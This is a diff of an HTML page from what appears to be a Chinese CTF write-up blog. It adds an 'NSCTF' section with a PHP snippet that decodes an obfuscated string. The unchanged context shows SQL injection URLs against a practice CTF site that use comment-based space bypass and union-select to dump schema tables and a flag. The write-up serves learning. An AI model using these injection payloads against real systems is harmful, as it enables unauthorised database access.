@@ -92,7 +92,7 @@
 <meta property="og:image" content="https://i.imgur.com/fLRKRmQ.png">
 <meta property="og:image" content="https://i.imgur.com/UJu82yd.png">
 <meta property="og:image" content="https://i.imgur.com/pAotWoT.png">
-<meta property="og:updated_time" content="2018-10-30T15:14:14.525Z">
+<meta property="og:updated_time" content="2018-11-30T11:40:24.434Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="实验吧Writeup">
 <meta name="twitter:description" content="sql注入MYSQL #后面内容会被注释version()获取数据库版本@@version_compile_os获取操作系统 天网管理系统查看源码md5弱类型构造user:s878926199a md5加密为0构造serialize，bool类型为True根据构造代码： &amp;lt;?php $test1=array(&amp;quot;user&amp;quot;=&amp;gt;true,&amp;quot;pass&amp;quot;">
@@ -341,7 +341,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  510
+                  563
                 </span>
               
 
@@ -357,7 +357,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  2
+                  3
                 </span>
               
             </div>
@@ -418,7 +418,23 @@ if &#39;FLAG&#39;in r.headers:
 <p>爆库 表 和列换注释绕过空格<br><code>http://ctf5.shiyanbar.com/423/web/?id=1&#39;/**/union/**/select/**/table_name/**/from/**/information_schema.tables/**/where/**/&#39;1&#39;=&#39;1</code></p>
 <p><code>http://ctf5.shiyanbar.com/423/web/?id=1&#39;/**/union/**/select/**/columcolumn_namen_name/**/from/**/information_scheminformation_schema.columnsa.columns/**/where/**/&#39;1&#39;=&#39;1</code></p>
 <p><code>http://ctf5.shiyanbar.com/web/index_2.php?id=1&#39;/**/union/**/select/**/flag/**/from/**/flag/**/where/**/&#39;1&#39;=&#39;1</code></p>
-<h1 id="简单的注入3"><a href="#简单的注入3" class="headerlink" title="简单的注入3"></a>简单的注入3</h1>
+<h1 id="简单的注入3"><a href="#简单的注入3" class="headerlink" title="简单的注入3"></a>简单的注入3</h1><h1 id="NSCTF"><a href="#NSCTF" class="headerlink" title="NSCTF"></a>NSCTF</h1><p>很简单的一个密码变换。一个逆序过程。附代码</p>
+<pre><code class="php">&lt;?php
+
+$_=&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;;
+
+
+$a=strrev(base64_decode((strrev((str_rot13($_))))));
+    for($i=0;$i&lt;strlen($a);$i++){
+        $b=substr($a,$i,1);
+        $c=ord($b)-1;
+        $d=chr($c);
+        $e=$e.$d;
+    }
+    echo &quot;$e&quot;;
+?&gt;
+</code></pre>
+
       
     </div>
     
@@ -638,7 +654,7 @@ if &#39;FLAG&#39;in r.headers:
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#sql注入"><span class="nav-number">1.</span> <span class="nav-text">sql注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#天网管理系统"><span class="nav-number">2.</span> <span class="nav-text">天网管理系统</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#忘记密码了"><span class="nav-number">3.</span> <span class="nav-text">忘记密码了</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#天下武功唯快不破"><span class="nav-number">4.</span> <span class="nav-text">天下武功唯快不破</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#简单的注入"><span class="nav-number">5.</span> <span class="nav-text">简单的注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#简单的注入2"><span class="nav-number">6.</span> <span class="nav-text">简单的注入2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#简单的注入3"><span class="nav-number">7.</span> <span class="nav-text">简单的注入3</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#sql注入"><span class="nav-number">1.</span> <span class="nav-text">sql注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#天网管理系统"><span class="nav-number">2.</span> <span class="nav-text">天网管理系统</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#忘记密码了"><span class="nav-number">3.</span> <span class="nav-text">忘记密码了</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#天下武功唯快不破"><span class="nav-number">4.</span> <span class="nav-text">天下武功唯快不破</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#简单的注入"><span class="nav-number">5.</span> <span class="nav-text">简单的注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#简单的注入2"><span class="nav-number">6.</span> <span class="nav-text">简单的注入2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#简单的注入3"><span class="nav-number">7.</span> <span class="nav-text">简单的注入3</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#NSCTF"><span class="nav-number">8.</span> <span class="nav-text">NSCTF</span></a></li></ol></div>
             
 
           </div>
